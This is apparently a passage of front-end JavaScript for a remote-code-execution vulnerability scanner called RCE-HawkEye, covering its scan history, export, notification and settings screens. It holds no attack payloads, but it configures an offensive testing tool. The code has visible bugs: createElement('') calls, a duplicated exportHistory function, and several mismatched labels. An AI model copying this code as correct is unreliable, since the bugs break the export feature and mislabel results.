                h.timestamp +
                '</span>' +
                '<span class="history-meta-item">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg>' +
                escapeHtml(h.domain || 'N/A') +
                '</span>' +
                '</div>' +
                '</div>' +
                '<div class="history-vuln-count ' + vulnCountClass + '" data-action="detail" data-id="' + escapeHtml(h.id) + '">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
                (h.vuln_count || 0) +
                '</div>' +
                '<span class="history-status ' + statusClass + '" data-action="detail" data-id="' + escapeHtml(h.id) + '">' + h.status + '</span>' +
                '<button class="history-delete-btn" data-action="delete" data-id="' + escapeHtml(h.id) + '" title="Delete">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>' +
                '</button>' +
                '</div>';
        });
        
        list.innerHTML = html;
        
        // Add event delegation for history items
        list.onclick = function(e) {
            var target = e.target.closest('[data-action]');
            if (!target) return;
            
            var action = target.getAttribute('data-action');
            var id = target.getAttribute('data-id');
            
            if (action === 'delete') {
                e.stopPropagation();
                doDeleteHistory(id);
            } else if (action === 'detail') {
                e.stopPropagation();
                showHistoryDetail(id);
            }
        };
        
        // Add checkbox change handlers
        list.querySelectorAll('.history-select').forEach(function(cb) {
            cb.onchange = function() {
                updateSelectedCount();
            };
        });
        
        loadHistoryStats();
        loadHistoryDates();
    } catch (error) {
        console.error('Failed to load history:', error);
    }
}

function toggleSelectAllHistory() {
    var selectAll = document.getElementById('selectAllHistory');
    var isChecked = selectAll ? selectAll.checked : false;
    document.querySelectorAll('.history-select').forEach(function(cb) {
        cb.checked = isChecked;
    });
    updateSelectedCount();
}

function updateSelectedCount() {
    var count = document.querySelectorAll('.history-select:checked').length;
    var countEl = document.getElementById('selectedCount');
    var batchActions = document.getElementById('historyBatchActions');
    
    if (countEl) countEl.textContent = count;
    if (batchActions) {
        batchActions.style.display = count > 0 ? 'flex' : 'none';
    }
    
    var selectAll = document.getElementById('selectAllHistory');
    var total = document.querySelectorAll('.history-select').length;
    if (selectAll) {
        selectAll.checked = count > 0 && count === total;
    }
}

function selectAllHistory() {
    document.querySelectorAll('.history-select').forEach(function(cb) {
        cb.checked = true;
    });
    updateSelectedCount();
}

function deselectAllHistory() {
    document.querySelectorAll('.history-select').forEach(function(cb) {
        cb.checked = false;
    });
    updateSelectedCount();
}

async function doDeleteHistory(id) {
    console.log('[DEBUG] doDeleteHistory called with id:', id);
    
    if (!id) {
        console.error('[DEBUG] doDeleteHistory: id is empty');
        alert('Error: Invalid ID');
        return;
    }
    
    if (!confirm(safeT('history.confirmDelete', 'Are you sure you want to delete this record?'))) {
        return;
    }
    
    try {
        console.log('[DEBUG] Sending delete request for id:', id);
        
        var response = await fetch('/api/history/delete/' + encodeURIComponent(id), {
            method: 'POST',
            credentials: 'same-origin',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        console.log('[DEBUG] Response status:', response.status);
        
        if (response.status === 401) {
            alert(safeT('common.sessionExpired', 'Session expired, please login again'));
            window.location.href = '/login';
            return;
        }
        
        var data = await response.json();
        console.log('[DEBUG] Response data:', data);
        
        if (data.success) {
            alert(safeT('history.deleteSuccess', 'Deleted successfully'));
            loadHistory();
        } else {
            alert(safeT('history.deleteFailed', 'Delete failed') + ': ' + (data.error || data.message || 'Unknown error'));
        }
    } catch (error) {
        console.error('[DEBUG] Delete error:', error);
        alert(safeT('history.deleteFailed', 'Delete failed') + ': ' + error.message);
    }
}

function deleteSingleHistory(id) {
    doDeleteHistory(id);
}

async function deleteSelectedHistory() {
    var selectedIds = [];
    document.querySelectorAll('.history-select:checked').forEach(function(cb) {
        selectedIds.push(cb.value);
    });
    
    if (selectedIds.length === 0) {
        alert(safeT('history.selectFirst', 'Please select records to delete'));
        return;
    }
    
    if (!confirm(safeT('history.confirmDelete', 'Delete selected items?'))) {
        return;
    }
    
    try {
        var response = await fetch('/api/history/batch-delete', {
            method: 'POST',
            credentials: 'same-origin',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ids: selectedIds })
        });
        
        if (response.status === 401) {
            alert(safeT('common.sessionExpired', 'Session expired, please login again'));
            window.location.href = '/login';
            return;
        }
        
        var data = await response.json();
        console.log('[DEBUG] Batch delete response:', data);
        
        if (data.success) {
            alert(safeT('history.deleteSuccess', 'Deleted successfully'));
            loadHistory();
        } else {
            alert(safeT('history.deleteFailed', 'Delete failed') + ': ' + (data.error || data.message || 'Unknown error'));
        }
    } catch (error) {
        console.error('[DEBUG] Batch delete error:', error);
        alert(safeT('history.deleteFailed', 'Delete failed') + ': ' + error.message);
    }
}

async function loadHistoryStats() {
    try {
        var response = await fetch('/api/history/stats');
        var data = await response.json();
        
        if (data.stats) {
            var totalScans = document.getElementById('totalScans');
            var totalDomains = document.getElementById('totalDomains');
            var totalVulns = document.getElementById('totalVulns');
            var totalCritical = document.getElementById('totalCritical');
            
            if (totalScans) totalScans.textContent = data.stats.total_scans || 0;
            if (totalDomains) totalDomains.textContent = data.stats.domains_scanned || 0;
            if (totalVulns) totalVulns.textContent = data.stats.total_vulns || 0;
            if (totalCritical) totalCritical.textContent = data.stats.critical_vulns || 0;
        }
    } catch (error) {
        console.error('Failed to load history stats:', error);
    }
}

async function loadHistoryDates() {
    try {
        var response = await fetch('/api/history/dates');
        var data = await response.json();
        
        var select = document.getElementById('historyDateFilter');
        if (select && data.dates) {
            var html = '<option value="">All Dates</option>';
            data.dates.forEach(function(date) {
                html += '<option value="' + date + '">' + date + '</option>';
            });
            select.innerHTML = html;
        }
    } catch (error) {
        console.error('Failed to load history dates:', error);
    }
}

async function searchHistory() {
    var query = document.getElementById('historySearchInput').value;
    var dateFilter = document.getElementById('historyDateFilter').value;
    var statusFilter = document.getElementById('historyStatusFilter').value;
    var sortOrder = document.getElementById('historySortOrder').value;
    
    try {
        var response = await fetch('/api/history/search', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                query: query,
                date: dateFilter,
                status: statusFilter,
                sort_by: 'date',
                sort_order: sortOrder,
                page: 1,
                page_size: 50
            })
        });
        var data = await response.json();
        
        var list = document.getElementById('historyList');
        if (!list) return;
        
        if (!data.results || data.results.length === 0) {
            list.innerHTML = '<div class="empty-state">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 3h18v18H3z"/><path d="M3 9h18"/><path d="M9 21V9"/></svg>' +
                '<p>' + safeT('history.noData', 'No scan history') + '</p>' +
                '<span class="sub-text">' + safeT('history.noDataHint', 'Start a new scan to see results here') + '</span>' +
                '</div>';
            return;
        }
        
        var html = '';
        data.results.forEach(function(h) {
            var statusClass = h.status === 'completed' ? 'completed' : h.status === 'running' ? 'running' : 'error';
            var iconClass = h.status === 'completed' ? '' : h.status === 'running' ? 'cyan' : 'red';
            var vulnCountClass = (h.vuln_count || 0) > 0 ? ((h.critical_vulns || 0) > 0 ? 'critical' : '') : '';
            
            html += '<div class="history-item" onclick="showHistoryDetail(\'' + h.id + '\')">' +
                '<input type="checkbox" class="history-checkbox" data-id="' + h.id + '" onclick="event.stopPropagation(); toggleHistorySelection(\'' + h.id + '\')">' +
                '<div class="history-icon ' + iconClass + '">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>' +
                '</div>' +
                '<div class="history-content">' +
                '<div class="history-target">' + escapeHtml(h.target) + '</div>' +
                '<div class="history-meta">' +
                '<span class="history-meta-item">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>' +
                h.date +
                '</span>' +
                '<span class="history-meta-item domain-link" onclick="event.stopPropagation(); showDomainDetail(\'' + escapeHtml(h.domain || '') + '\')">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg>' +
                escapeHtml(h.domain || 'N/A') +
                '</span>' +
                '</div>' +
                '</div>' +
                '<div class="history-vuln-count ' + vulnCountClass + '">' +
                '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
                (h.vuln_count || 0) +
                '</div>' +
                '<span class="history-status ' + statusClass + '">' + h.status + '</span>' +
                '</div>';
        });
        
        list.innerHTML = html;
    } catch (error) {
        console.error('Failed to search history:', error);
    }
}

var selectedHistoryIds = [];

function toggleHistorySelection(id) {
    var index = selectedHistoryIds.indexOf(id);
    if (index > -1) {
        selectedHistoryIds.splice(index, 1);
    } else {
        selectedHistoryIds.push(id);
    }
    updateBatchActions();
}

function updateBatchActions() {
    var batchActions = document.getElementById('historyBatchActions');
    var selectedCount = document.getElementById('selectedCount');
    
    if (selectedHistoryIds.length > 0) {
        batchActions.style.display = 'flex';
        selectedCount.textContent = selectedHistoryIds.length;
    } else {
        batchActions.style.display = 'none';
    }
}

async function showDomainDetail(domain) {
    if (!domain || domain === 'N/A') return;
    
    try {
        var response = await fetch('/api/history/domain/' + encodeURIComponent(domain) + '?stats=true');
        var data = await response.json();
        
        if (!data.stats) {
            alert(safeT('common.error', 'Domain not found'));
            return;
        }
        
        var stats = data.stats;
        var html = '<div class="detail-section">' +
            '<h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg> ' + safeT('history.domainInfo', 'Domain Information') + '</h4>' +
            '<div class="detail-grid">' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.domain', 'Domain') + '</span><span class="detail-value">' + escapeHtml(domain) + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.totalScans', 'Total Scans') + '</span><span class="detail-value">' + stats.total_scans + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('proxy.testSuccess', 'Connection successful') + '</span><span class="detail-value" style="color: var(--accent-green);">' + stats.completed_scans + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('proxy.testFailed', 'Connection failed') + '</span><span class="detail-value" style="color: var(--accent-red);">' + stats.failed_scans + '</span></div>' +
            '</div>' +
            '</div>';
        
        html += '<div class="detail-section">' +
            '<h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> ' + safeT('history.vulnSummary', 'Vulnerability Summary') + '</h4>' +
            '<div class="detail-grid">' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.total', 'Total') + '</span><span class="detail-value">' + stats.total_vulns + '</span></div>' +
            '<div class="detail-item"><span class="detail-label" style="color: var(--accent-red);">' + safeT('proxy.testFailed', 'Connection failed') + '</span><span class="detail-value" style="color: var(--accent-red);">' + stats.critical_vulns + '</span></div>' +
            '<div class="detail-item"><span class="detail-label" style="color: var(--accent-yellow);">' + safeT('history.high', 'High') + '</span><span class="detail-value" style="color: var(--accent-yellow);">' + stats.high_vulns + '</span></div>' +
            '<div class="detail-item"><span class="detail-label" style="color: var(--accent-cyan);">' + safeT('history.medium', 'Medium') + '</span><span class="detail-value" style="color: var(--accent-cyan);">' + stats.medium_vulns + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.low', 'Low') + '</span><span class="detail-value">' + stats.low_vulns + '</span></div>' +
            '</div>' +
            '</div>';
        
        if (stats.vulnerabilities && stats.vulnerabilities.length > 0) {
            html += '<div class="detail-section"><h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg> ' + safeT('scanner.vulnerabilities', 'Vulnerabilities') + ' (' + stats.vulnerabilities.length + ')</h4>';
            html += '<div class="vuln-list">';
            var displayedVulns = stats.vulnerabilities.slice(0, 20);
            displayedVulns.forEach(function(v) {
                var severityClass = v.severity || 'low';
                html += '<div class="vuln-list-item ' + severityClass + '">' +
                    '<span class="vuln-severity">' + (v.severity || 'low') + '</span>' +
                    '<span class="vuln-type">' + escapeHtml(v.vuln_type || v.type) + '</span>' +
                    '<span class="vuln-param">' + escapeHtml(v.parameter || '') + '</span>' +
                    '</div>';
            });
            if (stats.vulnerabilities.length > 20) {
                html += '<p style="color: var(--text-muted); margin-top: 8px;">... and ' + (stats.vulnerabilities.length - 20) + ' more</p>';
            }
            html += '</div></div>';
        }
        
        document.getElementById('domainDetailContent').innerHTML = html;
        document.getElementById('domainDetailModal').style.display = 'flex';
    } catch (error) {
        console.error('Failed to load domain detail:', error);
    }
}

function closeDomainDetail() {
    document.getElementById('domainDetailModal').style.display = 'none';
}

var exportIds = [];

function exportHistory() {
    exportIds = [];
    document.getElementById('exportModal').style.display = 'flex';
}

function exportSelectedHistory() {
    if (selectedHistoryIds.length === 0) {
        alert(safeT('common.error', 'Domain not found'));
        return;
    }
    exportIds = selectedHistoryIds.slice();
    document.getElementById('exportModal').style.display = 'flex';
}

function closeExportModal() {
    document.getElementById('exportModal').style.display = 'none';
}

async function doExport() {
    var format = document.querySelector('input[name="exportFormat"]:checked').value;
    
    try {
        var response = await fetch('/api/history/export', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ format: format, ids: exportIds })
        });
        
        var blob = await response.blob();
        var url = window.URL.createObjectURL(blob);
        var a = document.createElement('');
        a.href = url;
        a.download = 'scan_history_' + format + '_' + new Date().toISOString().slice(0, 10) + '.' + format;
        a.click();
        window.URL.revokeObjectURL(url);
        
        closeExportModal();
    } catch (error) {
        console.error('Failed to export:', error);
        alert(safeT('common.error', 'Domain not found'));
    }
}

function filterHistory() {
    searchHistory();
}

async function showHistoryDetail(id) {
    try {
        var response = await fetch('/api/history/detail/' + id);
        var data = await response.json();
        
        if (!data.success || !data.scan) {
            alert(safeT('common.error', 'Domain not found'));
            return;
        }
        
        var scan = data.scan;
        var html = '<div class="detail-section">' +
            '<h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg> ' + safeT('history.basicInfo', 'Basic Information') + '</h4>' +
            '<div class="detail-grid">' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.target', 'Target') + '</span><span class="detail-value">' + escapeHtml(scan.target) + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.domain', 'Domain') + '</span><span class="detail-value">' + escapeHtml(scan.domain || 'N/A') + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.status', 'Status') + '</span><span class="detail-value">' + scan.status + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.startTime', 'Start Time') + '</span><span class="detail-value">' + scan.start_time + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.duration', 'Duration') + '</span><span class="detail-value">' + (scan.duration || 0).toFixed(2) + 's</span></div>' +
            '<div class="detail-item"><span class="detail-label">Scan Level</span><span class="detail-value">' + (scan.scan_level || 2) + '</span></div>' +
            '</div>' +
            '</div>';
        
        html += '<div class="detail-section">' +
            '<h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> ' + safeT('history.vulnSummary', 'Vulnerability Summary') + '</h4>' +
            '<div class="detail-grid">' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.total', 'Total') + '</span><span class="detail-value">' + (scan.vuln_count || 0) + '</span></div>' +
            '<div class="detail-item"><span class="detail-label" style="color: var(--accent-red);">' + safeT('history.critical', 'Critical') + '</span><span class="detail-value" style="color: var(--accent-red);">' + (scan.critical_vulns || 0) + '</span></div>' +
            '<div class="detail-item"><span class="detail-label" style="color: var(--accent-yellow);">' + safeT('history.high', 'High') + '</span><span class="detail-value" style="color: var(--accent-yellow);">' + (scan.high_vulns || 0) + '</span></div>' +
            '<div class="detail-item"><span class="detail-label" style="color: var(--accent-cyan);">' + safeT('history.medium', 'Medium') + '</span><span class="detail-value" style="color: var(--accent-cyan);">' + (scan.medium_vulns || 0) + '</span></div>' +
            '<div class="detail-item"><span class="detail-label">' + safeT('history.low', 'Low') + '</span><span class="detail-value">' + (scan.low_vulns || 0) + '</span></div>' +
            '</div>' +
            '</div>';
        
        if (scan.vulnerabilities && scan.vulnerabilities.length > 0) {
            html += '<div class="detail-section"><h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg> ' + safeT('scanner.vulnerabilities', 'Vulnerabilities') + '</h4>';
            html += '<div class="vuln-list">';
            scan.vulnerabilities.forEach(function(v) {
                var severityClass = v.severity || 'low';
                html += '<div class="vuln-list-item ' + severityClass + '">' +
                    '<span class="vuln-severity">' + (v.severity || 'low') + '</span>' +
                    '<span class="vuln-type">' + escapeHtml(v.vuln_type || v.type) + '</span>' +
                    '<span class="vuln-param">' + escapeHtml(v.parameter || '') + '</span>' +
                    '</div>';
            });
            html += '</div></div>';
        }
        
        html += '<div class="detail-section">' +
            '<h4><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg> ' + safeT('history.basicInfo', 'Basic Information') + '</h4>' +
            '<textarea id="historyNotes" class="input-field" rows="3" style="width: 100%; margin-bottom: 10px;">' + escapeHtml(scan.notes || '') + '</textarea>' +
            '<button class="btn-primary" onclick="saveHistoryNotes(\'' + id + '\')">' + safeT('about.download', 'Download') + '</button>' +
            '</div>';
        
        document.getElementById('historyDetailContent').innerHTML = html;
        document.getElementById('historyDetailModal').style.display = 'flex';
    } catch (error) {
        console.error('Failed to load history detail:', error);
    }
}

function closeHistoryDetail() {
    document.getElementById('historyDetailModal').style.display = 'none';
}

async function saveHistoryNotes(id) {
    var notes = document.getElementById('historyNotes').value;
    try {
        var response = await fetch('/api/history/notes/' + id, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ notes: notes })
        });
        var data = await response.json();
        if (data.success) {
            alert(safeT('common.saved', 'Saved successfully'));
        } else {
            alert(safeT('common.error', 'Failed to save'));
        }
    } catch (error) {
        console.error('Failed to save notes:', error);
        alert(safeT('common.error', 'Failed to save'));
    }
}

async function exportHistory() {
    var format = prompt('Export format (json/csv):', 'json');
    if (!format) return;
    
    try {
        var response = await fetch('/api/history/export', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ format: format, ids: [] })
        });
        
        var blob = await response.blob();
        var url = window.URL.createObjectURL(blob);
        var a = document.createElement('');
        a.href = url;
        a.download = 'scan_history.' + format;
        a.click();
        window.URL.revokeObjectURL(url);
    } catch (error) {
        console.error('Failed to export history:', error);
    }
}

async function clearHistory() {
    showConfirm(safeT('common.error', 'Error') || 'Clear all history?', async function() {
        try {
            await fetch('/api/history/clear', { method: 'POST' });
            loadHistory();
        } catch (error) {
            console.error('Failed to clear history:', error);
        }
    });
}

async function loadNotificationConfig() {
    try {
        var response = await fetch('/api/notification/config');
        var data = await response.json();
        
        if (data.config) {
            document.getElementById('notificationEnabled').checked = data.config.enabled || false;
            document.getElementById('wechatKey').value = data.config.wechat_key || '';
            document.getElementById('dingtalkKey').value = data.config.dingtalk_key || '';
            document.getElementById('emailHost').value = data.config.email_host || '';
            document.getElementById('emailPort').value = data.config.email_port || 587;
            document.getElementById('emailUser').value = data.config.email_user || '';
            document.getElementById('emailPass').value = data.config.email_pass || '';
            document.getElementById('emailFrom').value = data.config.email_from || '';
            document.getElementById('emailTo').value = data.config.email_to || '';
        }
    } catch (error) {
        console.error('Failed to load notification config:', error);
    }
}

async function saveNotificationConfig() {
    var config = {
        enabled: document.getElementById('notificationEnabled').checked,
        wechat_key: document.getElementById('wechatKey').value,
        dingtalk_key: document.getElementById('dingtalkKey').value,
        email_host: document.getElementById('emailHost').value,
        email_port: parseInt(document.getElementById('emailPort').value) || 587,
        email_user: document.getElementById('emailUser').value,
        email_pass: document.getElementById('emailPass').value,
        email_from: document.getElementById('emailFrom').value,
        email_to: document.getElementById('emailTo').value
    };
    
    try {
        var response = await fetch('/api/notification/config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(config)
        });
        var data = await response.json();
        
        if (data.success) {
            alert(safeT('common.settingsSaved', 'Settings saved successfully'));
        } else {
            alert(safeT('common.error', 'Error') + ': ' + (data.error || 'Unknown error'));
        }
    } catch (error) {
        console.error('Failed to save notification config:', error);
        alert(safeT('common.saveFailed', 'Failed to save settings') + ': ' + error.message);
    }
}

async function testNotification(type) {
    try {
        var response = await fetch('/api/notification/test', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: type })
        });
        var data = await response.json();
        
        if (data.success) {
            alert(safeT('notification.testSuccess', 'Test notification sent successfully'));
        } else {
            alert(safeT('common.error', 'Error') + ': ' + (data.errors ? data.errors.join(', ') : 'Unknown error'));
        }
    } catch (error) {
        console.error('Failed to test notification:', error);
        alert(safeT('notification.testFailed', 'Failed to send test notification') + ': ' + error.message);
    }
}

function toggleNotification() {
    var enabled = document.getElementById('notificationEnabled').checked;
    console.log('Notification enabled:', enabled);
}

function resetForm() {
    var fields = {
        'targetUrl': '',
        'urlFile': '',
        'rawTraffic': '',
        'scanLevel': '2',
        'scanMode': 'echo',
        'concurrent': '10',
        'timeout': '10',
        'httpMethod': 'GET',
        'httpPostData': '',
        'httpHeaders': '',
        'httpUserAgent': 'RCE-HawkEye/1.1.1',
        'proxyType': '',
        'proxyAddress': '',
        'proxyUsername': '',
        'proxyPassword': '',
        'dirThreads': '10',
        'dirWordlist': '',
        'dirFilterStatus': '200',
        'outputFormat': 'html',
        'outputDir': './reports'
    };
    
    Object.keys(fields).forEach(function(id) {
        var el = document.getElementById(id);
        if (el) el.value = fields[id];
    });
    
    var checkboxes = {
        'optCrawl': false,
        'optDirScan': true,
        'optParamFuzz': true,
        'optSmartDict': true,
        'optIncludeResponse': false,
        'optVerifySSL': false
    };
    
    Object.keys(checkboxes).forEach(function(id) {
        var el = document.getElementById(id);
        if (el) el.checked = checkboxes[id];
    });
    
    document.querySelectorAll('input[name="techStack"]').forEach(function(cb) {
        var val = cb.value;
        cb.checked = val === 'php' || val === 'jsp' || val === 'asp' || val === 'aspx' || val === 'python' || val === 'nodejs' || val === 'template';
    });
    document.querySelectorAll('input[name="payloadType"]').forEach(function(cb) {
        var val = cb.value;
        cb.checked = val === 'echo' || val === 'time' || val === 'code';
    });
    document.querySelectorAll('input[name="encoding"]').forEach(function(cb) {
        cb.checked = cb.value === 'url';
    });
    document.querySelectorAll('input[name="bypass"]').forEach(function(cb) {
        cb.checked = false;
    });
}

async function loadSettings() {
    try {
        var response = await fetch('/api/settings');
        var data = await response.json();
        
        if (data.success && data.settings) {
            var s = data.settings;
            var el;
            
            if (s.scan_level) {
                el = document.getElementById('defaultScanLevel');
                if (el) el.value = s.scan_level;
            }
            if (s.concurrent) {
                el = document.getElementById('defaultConcurrent');
                if (el) el.value = s.concurrent;
            }
            if (s.timeout) {
                el = document.getElementById('defaultTimeout');
                if (el) el.value = s.timeout;
            }
            if (s.output_format) {
                el = document.getElementById('defaultOutputFormat');
                if (el) el.value = s.output_format;
            }
            if (s.output_dir) {
                el = document.getElementById('defaultOutputDir');
                if (el) el.value = s.output_dir;
            }
            if (s.delay_threshold) {
                el = document.getElementById('defaultDelayThreshold');
                if (el) el.value = s.delay_threshold;
            }
            
            if (s.proxy_type) {
                el = document.getElementById('settingsProxyType');
                if (el) el.value = s.proxy_type;
            }
            if (s.proxy_address) {
                el = document.getElementById('settingsProxyAddress');
                if (el) el.value = s.proxy_address;
            }
            if (s.proxy_username) {
                el = document.getElementById('settingsProxyUsername');
                if (el) el.value = s.proxy_username;
            }
            
            if (s.http_method) {
                el = document.getElementById('settingsHttpMethod');
                if (el) el.value = s.http_method;
            }
            if (s.http_delay_threshold) {
                el = document.getElementById('settingsDelayThreshold');
                if (el) el.value = s.http_delay_threshold;
            }
            if (s.http_headers) {
                el = document.getElementById('settingsHttpHeaders');
                if (el) el.value = s.http_headers;
            }
            if (s.http_user_agent) {
                el = document.getElementById('settingsHttpUserAgent');
                if (el) el.value = s.http_user_agent;
            }
            if (s.http_prefer_https !== undefined) {
                el = document.getElementById('settingsPreferHTTPS');
                if (el) el.checked = s.http_prefer_https;
            }
            if (s.http_no_https !== undefined) {
                el = document.getElementById('settingsNoHTTPS');
                if (el) el.checked = s.http_no_https;
            }
            if (s.http_verify_ssl !== undefined) {
                el = document.getElementById('settingsVerifySSL');
                if (el) el.checked = s.http_verify_ssl;
            }
            
            if (s.archive_threshold) {
                el = document.getElementById('dictArchiveThreshold');
                if (el) el.value = s.archive_threshold;
            }
            if (s.max_retention) {
                el = document.getElementById('dictMaxRetention');
                if (el) el.value = s.max_retention;
            }
            if (s.smart_dict !== undefined) {
                el = document.getElementById('optSmartDictGlobal');
                if (el) el.checked = s.smart_dict;
            }
            if (s.dir_wordlist) {
                el = document.getElementById('dictDirWordlist');
                if (el) el.value = s.dir_wordlist;
            }
            if (s.param_wordlist) {
                el = document.getElementById('dictParamWordlist');
                if (el) el.value = s.param_wordlist;
            }
            
            if (s.verify_ssl !== undefined) {
                el = document.getElementById('optVerifySSLGlobal');
                if (el) el.checked = s.verify_ssl;
            }
            if (s.prefer_https !== undefined) {
                el = document.getElementById('optPreferHTTPSGlobal');
                if (el) el.checked = s.prefer_https;
            }
            if (s.harmless !== undefined) {
                el = document.getElementById('optHarmlessGlobal');
                if (el) el.checked = s.harmless;
            }
        }
    } catch (error) {
        console.error('Failed to load settings:', error);
    }
}

async function saveSettings() {
    var newPassword = document.getElementById('newPassword');
    var confirmPassword = document.getElementById('confirmPassword');
    
    if (newPassword && newPassword.value && newPassword.value !== confirmPassword.value) {
        alert(safeT('settings.passwordMismatch', 'Passwords do not match'));
        return;
    }
    
    function getVal(id, def) {
        var el = document.getElementById(id);
        return el ? el.value : def;
    }
    function getChecked(id, def) {
        var el = document.getElementById(id);
        return el ? el.checked : def;
    }
    function getInt(id, def) {
        var el = document.getElementById(id);
        return el ? parseInt(el.value) : def;
    }
    function getFloat(id, def) {
        var el = document.getElementById(id);
        return el ? parseFloat(el.value) : def;
    }
    function getCheckedValues(name) {
        var values = [];
        document.querySelectorAll('input[name="' + name + '"]:checked').forEach(function(el) {
            values.push(el.value);
        });
        return values;
    }
    
    var settings = {
        scan_level: getInt('defaultScanLevel', 2),
        concurrent: getInt('defaultConcurrent', 10),
        timeout: getInt('defaultTimeout', 10),
        output_format: getVal('defaultOutputFormat', 'html'),
        output_dir: getVal('defaultOutputDir', './reports'),
        delay_threshold: getFloat('defaultDelayThreshold', 4),
        
        proxy_type: getVal('settingsProxyType', ''),
        proxy_address: getVal('settingsProxyAddress', ''),
        proxy_username: getVal('settingsProxyUsername', ''),
        proxy_password: getVal('settingsProxyPassword', ''),
        
        http_method: getVal('settingsHttpMethod', 'auto'),
        http_delay_threshold: getFloat('settingsDelayThreshold', 4),
        http_headers: getVal('settingsHttpHeaders', ''),
        http_user_agent: getVal('settingsHttpUserAgent', 'RCE-HawkEye/1.1.1'),
        http_prefer_https: getChecked('settingsPreferHTTPS', true),
        http_no_https: getChecked('settingsNoHTTPS', false),
        http_verify_ssl: getChecked('settingsVerifySSL', false),
        
        target_os: getVal('settingsTargetOS', 'both'),
        tech_stack: getCheckedValues('settingsTechStack'),
        payload_types: getCheckedValues('settingsPayloadType'),
        custom_payloads: getVal('settingsCustomPayloads', ''),
        custom_wordlist: getVal('settingsCustomWordlist', ''),
        
        crawl_depth: getInt('settingsCrawlDepth', 2),
        crawl_pages: getInt('settingsCrawlPages', 100),
        dir_threads: getInt('settingsDirThreads', 10),
        dir_filter_status: getVal('settingsDirFilterStatus', '200'),
        dir_filter_ext: getVal('settingsDirFilterExt', ''),
        dir_filter_pattern: getVal('settingsDirFilterPattern', ''),
